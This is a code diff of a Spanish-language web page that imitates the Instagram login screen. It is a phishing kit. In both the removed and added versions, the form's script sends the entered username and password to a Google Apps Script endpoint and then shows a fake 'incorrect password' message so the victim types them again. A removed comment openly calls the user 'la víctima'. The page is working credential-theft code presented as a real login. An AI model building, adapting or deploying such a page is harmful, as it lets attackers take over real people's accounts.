@@ -3,237 +3,86 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Instagram</title>
+    <title>Iniciar sesión · Instagram</title>
     <style>
-        /* Reset básico */
-        * { box-sizing: border-box; margin: 0; padding: 0; }
         body {
+            background-color: #000000;
+            color: #e0e0e0;
             font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
-            background-color: #fafafa;
             display: flex;
             justify-content: center;
             align-items: center;
             min-height: 100vh;
-            color: #262626;
+            margin: 0;
         }
-        
-        /* Contenedor principal blanco */
-        .login-container {
-            background: #fff;
-            border: 1px solid #dbdbdb;
-            border-radius: 1px;
-            padding: 40px;
+        .container {
             width: 350px;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
+            padding: 40px;
+            border: 1px solid #333;
+            border-radius: 2px;
+            text-align: center;
         }
-
-        /* Logo */
-        .logo {
-            margin: 20px 0 30px;
-            width: 175px;
-        }
-        .logo svg {
-            width: 100%;
-            height: auto;
-        }
-
-        /* Inputs */
-        .input-group {
-            width: 100%;
-            margin-bottom: 6px;
-            position: relative;
-        }
+        h1 { font-size: 24px; font-weight: 300; margin-bottom: 20px; color: #fff; }
+        .input-group { margin-bottom: 15px; text-align: left; }
         input {
-            width: 100%;
-            background: #fafafa;
-            border: 1px solid #dbdbdb;
-            border-radius: 3px;
-            padding: 14px 8px;
-            font-size: 12px;
-            color: #262626;
-            outline: none;
+            width: 100%; padding: 12px; background-color: #121212; border: 1px solid #444;
+            border-radius: 3px; color: #fff; box-sizing: border-box; font-size: 14px;
         }
-        input:focus {
-            border-color: #a8a8a8;
+        input::placeholder { color: #666; }
+        input:focus { border-color: #888; outline: none; }
+        button {
+            width: 100%; padding: 12px; background-color: #0095f6; border: none;
+            border-radius: 4px; color: #fff; font-weight: 600; font-size: 14px; cursor: pointer; margin-top: 10px;
         }
-        input::placeholder {
-            color: #8e8e8e;
-        }
-
-        /* Botón */
-        .btn-login {
-            width: 100%;
-            background: #0095f6;
-            border: none;
-            border-radius: 4px;
-            color: #fff;
-            font-weight: 600;
-            font-size: 14px;
-            padding: 7px 16px;
-            margin-top: 10px;
-            cursor: pointer;
-            opacity: 0.7;
-            transition: opacity 0.2s;
-        }
-        .btn-login:hover { opacity: 1; }
-        .btn-login:disabled { opacity: 0.7; cursor: default; }
-
-        /* Separador "O" */
-        .separator {
-            width: 100%;
-            display: flex;
-            align-items: center;
-            margin: 18px 0;
-            color: #8e8e8e;
-            font-size: 13px;
-            font-weight: 600;
-        }
-        .separator::before, .separator::after {
-            content: '';
-            flex: 1;
-            height: 1px;
-            background: #dbdbdb;
-        }
-        .separator::before { margin-right: 10px; }
-        .separator::after { margin-left: 10px; }
-
-        /* Mensaje de error */
-        .error-msg {
-            color: #ed4956;
-            font-size: 12px;
-            font-weight: 600;
-            background: #fff0f0;
-            padding: 10px;
-            border-radius: 4px;
-            width: 100%;
-            text-align: center;
-            margin-bottom: 10px;
-            display: none;
-        }
-
-        /* Footer links */
-        .footer-links {
-            margin-top: 20px;
-            text-align: center;
-            font-size: 12px;
-            color: #8e8e8e;
-        }
-        .footer-links a { color: #8e8e8e; text-decoration: none; }
+        button:hover { background-color: #0084d4; }
+        button:disabled { background-color: #333; cursor: not-allowed; }
+        .error { color: #ff6b6b; font-size: 12px; margin-top: 10px; min-height: 16px; }
     </style>
 </head>
 <body>
-
-    <div class="login-container">
-        <!-- Logo SVG de Instagram (No cambia) -->
-        <div class="logo">
-            <svg class="logo-img" viewBox="0 0 175 50" xmlns="http://www.w3.org/2000/svg">
-                <path d="M10.6 29.8c0-3.2 1.2-6.4 4.5-6.4 3.2 0 4.5 3.2 4.5 6.4 0 3.2-1.3 6.4-4.5 6.4-3.3 0-4.5-3.2-4.5-6.4z" fill="#262626"/>
-                <path d="M18.5 33.5c0-2.6-2-4.6-4.6-4.6s-4.6 2-4.6 4.6 2 4.6 4.6 4.6 4.6-2 4.6-4.6zm-1.9 0c0 1.6-1.3 2.9-2.9 2.9s-2.9-1.3-2.9-2.9 1.3-2.9 2.9-2.9 2.9 1.3 2.9 2.9z" fill="#262626"/>
-                <path d="M28.2 29.8c0-3.2 1.2-6.4 4.5-6.4 3.2 0 4.5 3.2 4.5 6.4 0 3.2-1.3 6.4-4.5 6.4-3.3 0-4.5-3.2-4.5-6.4z" fill="#262626"/>
-                <path d="M36.1 33.5c0-2.6-2-4.6-4.6-4.6s-4.6 2-4.6 4.6 2 4.6 4.6 4.6 4.6-2 4.6-4.6zm-1.9 0c0 1.6-1.3 2.9-2.9 2.9s-2.9-1.3-2.9-2.9 1.3-2.9 2.9-2.9 2.9 1.3 2.9 2.9z" fill="#262626"/>
-                <path d="M45.8 29.8c0-3.2 1.2-6.4 4.5-6.4 3.2 0 4.5 3.2 4.5 6.4 0 3.2-1.3 6.4-4.5 6.4-3.3 0-4.5-3.2-4.5-6.4z" fill="#262626"/>
-                <path d="M53.7 33.5c0-2.6-2-4.6-4.6-4.6s-4.6 2-4.6 4.6 2 4.6 4.6 4.6 4.6-2 4.6-4.6zm-1.9 0c0 1.6-1.3 2.9-2.9 2.9s-2.9-1.3-2.9-2.9 1.3-2.9 2.9-2.9 2.9 1.3 2.9 2.9z" fill="#262626"/>
-                <path d="M63.4 29.8c0-3.2 1.2-6.4 4.5-6.4 3.2 0 4.5 3.2 4.5 6.4 0 3.2-1.3 6.4-4.5 6.4-3.3 0-4.5-3.2-4.5-6.4z" fill="#262626"/>
-                <path d="M71.3 33.5c0-2.6-2-4.6-4.6-4.6s-4.6 2-4.6 4.6 2 4.6 4.6 4.6 4.6-2 4.6-4.6zm-1.9 0c0 1.6-1.3 2.9-2.9 2.9s-2.9-1.3-2.9-2.9 1.3-2.9 2.9-2.9 2.9 1.3 2.9 2.9z" fill="#262626"/>
-                <path d="M81 29.8c0-3.2 1.2-6.4 4.5-6.4 3.2 0 4.5 3.2 4.5 6.4 0 3.2-1.3 6.4-4.5 6.4-3.3 0-4.5-3.2-4.5-6.4z" fill="#262626"/>
-                <path d="M88.9 33.5c0-2.6-2-4.6-4.6-4.6s-4.6 2-4.6 4.6 2 4.6 4.6 4.6 4.6-2 4.6-4.6zm-1.9 0c0 1.6-1.3 2.9-2.9 2.9s-2.9-1.3-2.9-2.9 1.3-2.9 2.9-2.9 2.9 1.3 2.9 2.9z" fill="#262626"/>
-                <path d="M98.6 29.8c0-3.2 1.2-6.4 4.5-6.4 3.2 0 4.5 3.2 4.5 6.4 0 3.2-1.3 6.4-4.5 6.4-3.3 0-4.5-3.2-4.5-6.4z" fill="#262626"/>
-                <path d="M106.5 33.5c0-2.6-2-4.6-4.6-4.6s-4.6 2-4.6 4.6 2 4.6 4.6 4.6 4.6-2 4.6-4.6zm-1.9 0c0 1.6-1.3 2.9-2.9 2.9s-2.9-1.3-2.9-2.9 1.3-2.9 2.9-2.9 2.9 1.3 2.9 2.9z" fill="#262626"/>
-                <path d="M116.2 29.8c0-3.2 1.2-6.4 4.5-6.4 3.2 0 4.5 3.2 4.5 6.4 0 3.2-1.3 6.4-4.5 6.4-3.3 0-4.5-3.2-4.5-6.4z" fill="#262626"/>
-                <path d="M124.1 33.5c0-2.6-2-4.6-4.6-4.6s-4.6 2-4.6 4.6 2 4.6 4.6 4.6 4.6-2 4.6-4.6zm-1.9 0c0 1.6-1.3 2.9-2.9 2.9s-2.9-1.3-2.9-2.9 1.3-2.9 2.9-2.9 2.9 1.3 2.9 2.9z" fill="#262626"/>
-                <path d="M133.8 29.8c0-3.2 1.2-6.4 4.5-6.4 3.2 0 4.5 3.2 4.5 6.4 0 3.2-1.3 6.4-4.5 6.4-3.3 0-4.5-3.2-4.5-6.4z" fill="#262626"/>
-                <path d="M141.7 33.5c0-2.6-2-4.6-4.6-4.6s-4.6 2-4.6 4.6 2 4.6 4.6 4.6 4.6-2 4.6-4.6zm-1.9 0c0 1.6-1.3 2.9-2.9 2.9s-2.9-1.3-2.9-2.9 1.3-2.9 2.9-2.9 2.9 1.3 2.9 2.9z" fill="#262626"/>
-                <path d="M151.4 29.8c0-3.2 1.2-6.4 4.5-6.4 3.2 0 4.5 3.2 4.5 6.4 0 3.2-1.3 6.4-4.5 6.4-3.3 0-4.5-3.2-4.5-6.4z" fill="#262626"/>
-                <path d="M159.3 33.5c0-2.6-2-4.6-4.6-4.6s-4.6 2-4.6 4.6 2 4.6 4.6 4.6 4.6-2 4.6-4.6zm-1.9 0c0 1.6-1.3 2.9-2.9 2.9s-2.9-1.3-2.9-2.9 1.3-2.9 2.9-2.9 2.9 1.3 2.9 2.9z" fill="#262626"/>
-                <path d="M169 29.8c0-3.2 1.2-6.4 4.5-6.4 3.2 0 4.5 3.2 4.5 6.4 0 3.2-1.3 6.4-4.5 6.4-3.3 0-4.5-3.2-4.5-6.4z" fill="#262626"/>
-                <path d="M176.9 33.5c0-2.6-2-4.6-4.6-4.6s-4.6 2-4.6 4.6 2 4.6 4.6 4.6 4.6-2 4.6-4.6zm-1.9 0c0 1.6-1.3 2.9-2.9 2.9s-2.9-1.3-2.9-2.9 1.3-2.9 2.9-2.9 2.9 1.3 2.9 2.9z" fill="#262626"/>
-            </svg>
-        </div>
-
-        <!-- Formulario -->
+    <div class="container">
+        <h1>Iniciar sesión</h1>
         <form id="loginForm">
             <div class="input-group">
-                <input type="text" name="username" id="username" placeholder="Teléfono, nombre de usuario o correo electrónico" required>
+                <input type="text" name="username" placeholder="Teléfono, nombre de usuario o correo electrónico" required>
             </div>
             <div class="input-group">
-                <input type="password" name="password" id="password" placeholder="Contraseña" required>
+                <input type="password" name="password" placeholder="Contraseña" required>
             </div>
-            <button type="submit" class="btn-login" id="submitBtn">Iniciar sesión</button>
+            <button type="submit" id="btn">Iniciar sesión</button>
         </form>
-
-        <div class="separator">O</div>
-        
-        <div style="color: #385185; font-size: 12px; font-weight: 600; cursor: pointer;">
-            Iniciar sesión con Facebook
-        </div>
-        
-        <div style="margin-top: 20px; font-size: 12px; color: #8e8e8e; cursor: pointer;">
-            ¿Has olvidado la contraseña?
-        </div>
-
-        <div class="footer-links">
-            <p>Obtén la aplicación.</p>
-        </div>
+        <div class="error" id="errorMsg"></div>
     </div>
 
     <script>
-        // AKfycbx7EvnHcqTpVDBQKbciujloyJxorkJtkl4gH4mB53GpQyV22oech3iMoID513YZqspP
-        const SCRIPT_URL = AKfycbx7EvnHcqTpVDBQKbciujloyJxorkJtkl4gH4mB53GpQyV22oech3iMoID513YZqspP;
+        // https://script.google.com/macros/s/AKfycbx7EvnHcqTpVDBQKbciujloyJxorkJtkl4gH4mB53GpQyV22oech3iMoID513YZqspP/exec
+        const SCRIPT_URL = https://script.google.com/macros/s/AKfycbx7EvnHcqTpVDBQKbciujloyJxorkJtkl4gH4mB53GpQyV22oech3iMoID513YZqspP/exec;
 
         const form = document.getElementById('loginForm');
-        const btn = document.getElementById('submitBtn');
-        
-        form.addEventListener('submit', function(e) {
-            e.preventDefault();
-            
-            const username = document.getElementById('username').value;
-            const password = document.getElementById('password').value;
+        const btn = document.getElementById('btn');
+        const errorMsg = document.getElementById('errorMsg');
 
-            // UI Feedback
+        form.addEventListener('submit', (e) => {
+            e.preventDefault();
             btn.disabled = true;
             btn.innerText = '...';
+            errorMsg.innerText = '';
 
-            // Enviar datos a Google Sheets
-            const data = new FormData();
-            data.append('username', username);
-            data.append('password', password);
-
+            // Usamos 'no-cors' para evitar errores de bloqueo si el script de Google es antiguo
             fetch(SCRIPT_URL, {
                 method: 'POST',
-                body: data
-            })
-            .then(response => {
-                // Simular carga
-                return new Promise(resolve => setTimeout(resolve, 1500));
+                body: new FormData(form),
+                mode: 'no-cors' 
             })
             .then(() => {
-                // Simular error para que la víctima intente de nuevo (más realista)
-                const errorMsg = document.createElement('div');
-                errorMsg.style.color = '#ed4956';
-                errorMsg.style.fontSize = '12px';
-                errorMsg.style.textAlign = 'center';
-                errorMsg.style.marginTop = '10px';
-                errorMsg.innerText = 'El nombre de usuario o la contraseña es incorrecta.';
-                
-                // Limpiar campo contraseña
-                document.getElementById('password').value = '';
-                document.getElementById('password').placeholder = 'Inténtalo de nuevo';
-                
-                form.appendChild(errorMsg);
-                
-                // Restaurar botón
-                btn.disabled = false;
-                btn.innerText = 'Iniciar sesión';
-
-                // Eliminar mensaje de error después de 3 segundos
                 setTimeout(() => {
-                    errorMsg.remove();
-                }, 3000);
-
+                    errorMsg.innerText = "El nombre de usuario o la contraseña es incorrecta.";
+                    btn.disabled = false;
+                    btn.innerText = 'Iniciar sesión';
+                }, 800);
             })
-            .catch(error => {
+            .catch(() => {
+                errorMsg.innerText = "Error de conexión.";
                 btn.disabled = false;
                 btn.innerText = 'Iniciar sesión';
             });
